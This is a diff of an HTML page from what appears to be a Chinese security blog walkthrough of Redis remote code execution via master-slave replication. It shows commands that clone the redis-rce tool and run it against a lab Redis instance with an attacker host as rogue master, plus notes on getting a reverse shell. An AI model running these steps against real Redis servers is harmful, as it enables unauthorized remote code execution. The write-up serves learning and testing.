@@ -241,13 +241,14 @@
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glegtkso4uj30zu0iwajl.jpg" alt="image-20201206213929485"></p>
 <p>使用攻击脚本</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br><span class="line">python3 redis-rce.py -r 10.211.55.4 -p 6379 -L 192.168.1.101 -f module.so</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glehp3qvdej31d00ps47m.jpg" alt="image-20201206220944389"></p>
 <p>选择shell的交互方式</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glehp3qvdej31d00ps47m.jpg" alt="image-20201206220944389"></p>
+<p>成功执行系统命令（所有执行的命令都会在redis日志中被记录）</p>
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glehxepexzj319w0iutgx.jpg" alt="image-20201206221745699"></p>
 <p>输入r进行反弹shell，我们在测试的时候发现使用反弹shell方式比较容易导致靶机redis服务异常中断，推荐使用shell交互模式。</p>
 <p>查看redis日志可以发现把攻击机当作master机器进行复制扩展</p>
 <p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glei0dpabhj31kk0oi4eb.jpg" alt="image-20201206222037601"></p>
-<p>另外redis主从复制还可以使用手动的方式，本地起恶意的redis服务器，监听本地端口加在exp.so文件。</p>
+<p>另外redis主从复制还可以使用手动的方式，本地起恶意的redis服务器，监听本地端口加载exp.so文件。</p>
 
                 
 
